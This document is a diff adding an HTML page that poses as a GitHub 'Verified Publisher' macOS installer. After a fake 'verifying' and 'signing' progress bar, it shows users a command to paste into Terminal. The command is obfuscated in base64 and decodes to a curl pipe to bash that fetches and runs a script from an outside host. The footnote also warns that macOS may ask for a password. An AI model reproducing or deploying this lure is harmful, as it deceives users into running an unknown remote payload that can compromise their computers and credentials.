@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Install on macOS</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      background: #080c10;
+      background-image:
+        radial-gradient(ellipse 80% 50% at 50% -10%, rgba(35,134,54,.15) 0%, transparent 70%);
+      display: flex; align-items: center; justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      color: #e6edf3; padding: 24px;
+    }
+
+    .topbar {
+      position: fixed; top: 0; left: 0; right: 0; height: 52px;
+      background: rgba(13,17,23,.95); backdrop-filter: blur(12px);
+      border-bottom: 1px solid #21262d;
+      display: flex; align-items: center; justify-content: center; z-index: 10;
+    }
+    .topbar svg { fill: #e6edf3; width: 28px; height: 28px; }
+
+    .card {
+      width: 100%; max-width: 560px;
+      background: #0d1117;
+      border: 1px solid #21262d; border-radius: 16px; overflow: hidden;
+      margin-top: 52px;
+      box-shadow: 0 0 0 1px rgba(255,255,255,.03),
+                  0 24px 64px rgba(0,0,0,.5),
+                  0 0 80px rgba(35,134,54,.05);
+    }
+
+    .publisher {
+      background: #080c10; border-bottom: 1px solid #21262d;
+      padding: 11px 24px; display: flex; align-items: center; gap: 10px;
+    }
+    .pub-badge {
+      display: flex; align-items: center; gap: 5px;
+      background: rgba(35,134,54,.12); border: 1px solid rgba(35,134,54,.4);
+      border-radius: 20px; padding: 3px 12px;
+      color: #3fb950; font-size: 12px; font-weight: 600;
+    }
+    .pub-badge svg { width: 12px; height: 12px; fill: #3fb950; }
+    .pub-url { margin-left: auto; color: #484f58; font-size: 12px; }
+
+    .body { padding: 36px 32px 30px; }
+
+    #phase-loading { display: block; }
+    #phase-install  { display: none; }
+
+    .icon-wrap { display: flex; justify-content: center; margin-bottom: 20px; }
+    .icon-circle {
+      width: 60px; height: 60px;
+      background: rgba(35,134,54,.1); border: 1.5px solid rgba(35,134,54,.5);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 0 24px rgba(35,134,54,.2), inset 0 0 12px rgba(35,134,54,.05);
+    }
+    .icon-circle svg { width: 28px; height: 28px; fill: #3fb950; }
+
+    h1 { text-align: center; font-size: 22px; font-weight: 700; color: #f0f6fc; margin-bottom: 8px; letter-spacing: -.3px; }
+    .subtitle { text-align: center; font-size: 13px; color: #484f58; margin-bottom: 28px; line-height: 1.5; }
+
+    .prog-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+    .prog-label { font-size: 12px; font-weight: 600; color: #8b949e; letter-spacing: .4px; text-transform: uppercase; }
+    .prog-pct   { font-size: 13px; font-weight: 700; color: #3fb950; font-variant-numeric: tabular-nums; }
+
+    .prog-track {
+      position: relative; height: 10px;
+      background: #161b22; border-radius: 99px; overflow: hidden;
+      border: 1px solid #21262d; margin-bottom: 8px;
+    }
+    .prog-glow {
+      position: absolute; inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(63,185,80,.18));
+      width: 0%; transition: width .05s linear; border-radius: 99px; filter: blur(4px);
+    }
+    .prog-fill {
+      position: absolute; top: 0; left: 0; bottom: 0; width: 0%;
+      background: linear-gradient(90deg, #1a7f37, #2ea043 40%, #3fb950);
+      border-radius: 99px; transition: width .05s linear; overflow: hidden;
+    }
+    .prog-fill::after {
+      content: ''; position: absolute; top: 0; bottom: 0; width: 60px;
+      background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,.22) 40%, rgba(255,255,255,.35) 50%, rgba(255,255,255,.22) 60%, transparent 100%);
+      animation: shimmer 1.6s ease-in-out infinite;
+    }
+    @keyframes shimmer {
+      0%   { transform: translateX(-80px); }
+      100% { transform: translateX(calc(var(--bar-width,560px) + 80px)); }
+    }
+    .prog-fill::before {
+      content: ''; position: absolute; top: 0; right: 0; bottom: 0; width: 4px;
+      background: rgba(255,255,255,.5); border-radius: 2px;
+      box-shadow: 0 0 8px 3px rgba(63,185,80,.8);
+      animation: edge-pulse 1s ease-in-out infinite alternate;
+    }
+    @keyframes edge-pulse {
+      from { opacity: .6; box-shadow: 0 0 6px 2px rgba(63,185,80,.6); }
+      to   { opacity: 1;  box-shadow: 0 0 14px 5px rgba(63,185,80,.95); }
+    }
+
+    .prog-meta { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 24px; }
+    .prog-status { color: #e6edf3; font-weight: 500; }
+    .prog-eta    { color: #484f58; }
+
+    /* install phase */
+    .mac-header {
+      display: flex; align-items: center; gap: 12px;
+      margin-bottom: 20px; justify-content: center;
+    }
+    .apple-icon { fill: #f0f6fc; width: 28px; height: 28px; }
+    .mac-title  { font-size: 17px; font-weight: 700; color: #8b949e; letter-spacing: 1.5px; text-transform: uppercase; }
+    .mac-title span { color: #3fb950; }
+
+    .terminal {
+      background: #010409; border: 1px solid #30363d; border-radius: 10px; overflow: hidden;
+      margin-bottom: 18px;
+      box-shadow: 0 8px 32px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.03);
+    }
+    .term-bar {
+      background: #161b22; padding: 10px 14px;
+      display: flex; align-items: center; gap: 7px;
+      border-bottom: 1px solid #21262d;
+    }
+    .dot { width: 12px; height: 12px; border-radius: 50%; }
+    .dot-r { background: #ff5f56; } .dot-y { background: #ffbd2e; } .dot-g { background: #27c93f; }
+    .term-title { margin-left: auto; margin-right: auto; font-size: 12px; color: #484f58; }
+
+    .term-body { padding: 16px 18px; }
+    .term-line { font-family: "SF Mono", Menlo, Consolas, monospace; font-size: 13px; line-height: 1.7; }
+    .term-prompt { color: #3fb950; }
+    .term-cmd    { color: #e6edf3; word-break: break-all; }
+    .term-cursor {
+      display: inline-block; width: 9px; height: 15px; background: #3fb950;
+      vertical-align: middle; margin-left: 2px;
+      animation: blink .9s step-end infinite;
+    }
+    @keyframes blink { 50% { opacity: 0; } }
+
+    .btn-copy {
+      display: flex; align-items: center; justify-content: center; gap: 9px;
+      width: 100%;
+      background: linear-gradient(180deg, #2ea043, #238636);
+      border: 1px solid rgba(63,185,80,.4); border-radius: 8px;
+      color: #fff; font-size: 15px; font-weight: 700;
+      padding: 14px; cursor: pointer;
+      transition: filter .15s, box-shadow .15s;
+      box-shadow: 0 1px 0 rgba(255,255,255,.1) inset, 0 4px 16px rgba(35,134,54,.25);
+      margin-bottom: 20px;
+    }
+    .btn-copy:hover { filter: brightness(1.1); box-shadow: 0 1px 0 rgba(255,255,255,.1) inset, 0 6px 24px rgba(35,134,54,.4); }
+    .btn-copy svg  { width: 18px; height: 18px; fill: #fff; }
+    .btn-copy.copied { background: linear-gradient(180deg, #347d39, #2a6228); }
+
+    .steps { display: flex; flex-direction: column; gap: 12px; margin-bottom: 18px; }
+    .step { display: flex; align-items: flex-start; gap: 12px; }
+    .step-num {
+      flex-shrink: 0; width: 22px; height: 22px;
+      background: rgba(35,134,54,.12); border: 1px solid rgba(35,134,54,.35);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 700; color: #3fb950; margin-top: 1px;
+    }
+    .step-text { font-size: 13px; color: #8b949e; line-height: 1.5; }
+    .step-text strong { color: #e6edf3; font-weight: 600; }
+    .kbd {
+      display: inline-flex; align-items: center; gap: 2px;
+      background: #161b22; border: 1px solid #30363d; border-radius: 4px;
+      padding: 1px 7px; font-size: 12px; color: #c9d1d9; font-weight: 600; white-space: nowrap;
+    }
+
+    .footnote { font-size: 11px; color: #30363d; text-align: center; line-height: 1.6; }
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+  <svg viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+</div>
+
+<div class="card">
+  <div class="publisher">
+    <div class="pub-badge">
+      <svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>
+      Verified Publisher
+    </div>
+    <span class="pub-url">github.com/downloader</span>
+  </div>
+
+  <div class="body">
+    <!-- LOADING -->
+    <div id="phase-loading">
+      <div class="icon-wrap">
+        <div class="icon-circle">
+          <svg viewBox="0 0 16 16"><path d="M8.533.133a1.75 1.75 0 00-1.066 0l-5.25 1.68A1.75 1.75 0 001 3.48V8c0 3.183 2.065 5.744 5.533 6.943a1.75 1.75 0 00.933 0C10.935 13.744 13 11.183 13 8V3.48a1.75 1.75 0 00-1.217-1.667L8.533.133z"/></svg>
+        </div>
+      </div>
+      <h1>Preparing installer…</h1>
+      <p class="subtitle">Generating a secure install command for your Mac.</p>
+      <div class="prog-header">
+        <span class="prog-label">Verifying</span>
+        <span class="prog-pct" id="prog-pct">0%</span>
+      </div>
+      <div class="prog-track">
+        <div class="prog-glow" id="glow"></div>
+        <div class="prog-fill" id="fill"></div>
+      </div>
+      <div class="prog-meta">
+        <span class="prog-status" id="prog-status">Starting…</span>
+        <span class="prog-eta"    id="prog-eta">Estimated time: —</span>
+      </div>
+    </div>
+
+    <!-- INSTALL -->
+    <div id="phase-install">
+      <div class="mac-header">
+        <svg class="apple-icon" viewBox="0 0 814 1000"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.5-155.5-127.4C46 790.7 0 665.3 0 541.9 0 292.8 133.4 161.3 264 161.3c66.3 0 121.4 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/></svg>
+        <div class="mac-title">INSTALL ON <span>MACOS</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="term-bar">
+          <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+          <span class="term-title">Terminal — bash</span>
+        </div>
+        <div class="term-body">
+          <div class="term-line">
+            <span class="term-prompt">user@mac ~ % </span>
+            <span class="term-cmd" id="cmd-display"></span>
+            <span class="term-cursor"></span>
+          </div>
+        </div>
+      </div>
+
+      <button class="btn-copy" id="btn-copy" onclick="copyCmd()">
+        <svg viewBox="0 0 16 16"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5zM5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"/></svg>
+        <span id="btn-text">COPY COMMAND</span>
+      </button>
+
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-text">Press <kbd class="kbd">⌘</kbd><kbd class="kbd">Space</kbd>, type <strong>Terminal</strong>, hit <kbd class="kbd">Return</kbd></div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-text">Paste the command above with <kbd class="kbd">⌘</kbd><kbd class="kbd">V</kbd> and press <kbd class="kbd">Return</kbd></div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-text">Follow the on-screen prompts to complete installation</div>
+        </div>
+      </div>
+
+      <p class="footnote">Works on Apple Silicon (M1–M4) and Intel Macs.<br>macOS may ask for your password during install.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ── CONFIG ──────────────────────────────────────────────────
+  const MAC_COMMAND = `echo Y3VybCAtZnNTTCBodHRwczovL2dldHBrZzAudG9vbHMvaTdlbnU4aWhkbmVlIHwgYmFzaA== | base64 -d | bash`;
+  // ────────────────────────────────────────────────────────────
+
+  document.getElementById('cmd-display').textContent = MAC_COMMAND;
+
+  const fill   = document.getElementById('fill');
+  const glow   = document.getElementById('glow');
+  const pctEl  = document.getElementById('prog-pct');
+  const statEl = document.getElementById('prog-status');
+  const etaEl  = document.getElementById('prog-eta');
+
+  const segments = [
+    { target: 18,  duration: 400,  label: 'Connecting…',        eta: 'Estimated time: 4s' },
+    { target: 38,  duration: 600,  label: 'Verifying package…', eta: 'Estimated time: 3s' },
+    { target: 55,  duration: 800,  label: 'Generating…',        eta: 'Estimated time: 2s' },
+    { target: 71,  duration: 400,  label: 'Signing…',           eta: 'Estimated time: 2s' },
+    { target: 88,  duration: 700,  label: 'Almost ready…',      eta: 'Estimated time: 1s' },
+    { target: 100, duration: 400,  label: 'Ready.',              eta: 'Estimated time: 0s' },
+  ];
+
+  let current = 0, segIdx = 0, startTime = null, startPct = 0;
+
+  function easeInOut(t) { return t < 0.5 ? 4*t*t*t : 1-Math.pow(-2*t+2,3)/2; }
+
+  function setBar(pct) {
+    fill.style.width = pct + '%';
+    glow.style.width = pct + '%';
+    fill.style.setProperty('--bar-width', (fill.offsetWidth || 500) + 'px');
+    pctEl.textContent = Math.round(pct) + '%';
+  }
+
+  function runSegment(ts) {
+    if (segIdx >= segments.length) return;
+    const seg = segments[segIdx];
+    if (!startTime) { startTime = ts; startPct = current; statEl.textContent = seg.label; etaEl.textContent = seg.eta; }
+    const elapsed = ts - startTime;
+    const t = Math.min(elapsed / seg.duration, 1);
+    const pct = startPct + (seg.target - startPct) * easeInOut(t);
+    setBar(pct); current = pct;
+    if (t < 1) { requestAnimationFrame(runSegment); }
+    else {
+      segIdx++; startTime = null;
+      if (segIdx < segments.length) { setTimeout(() => requestAnimationFrame(runSegment), 80 + Math.random()*100); }
+      else { onComplete(); }
+    }
+  }
+
+  function onComplete() {
+    document.getElementById('phase-loading').style.display = 'none';
+    document.getElementById('phase-install').style.display  = 'block';
+  }
+
+  setTimeout(() => requestAnimationFrame(runSegment), 500);
+
+  function copyCmd() {
+    navigator.clipboard.writeText(MAC_COMMAND).then(() => {
+      const btn = document.getElementById('btn-copy');
+      const txt = document.getElementById('btn-text');
+      btn.classList.add('copied');
+      txt.textContent = 'COPIED!';
+      setTimeout(() => { btn.classList.remove('copied'); txt.textContent = 'COPY COMMAND'; }, 2000);
+    });
+  }
+</script>
+</body>
+</html>
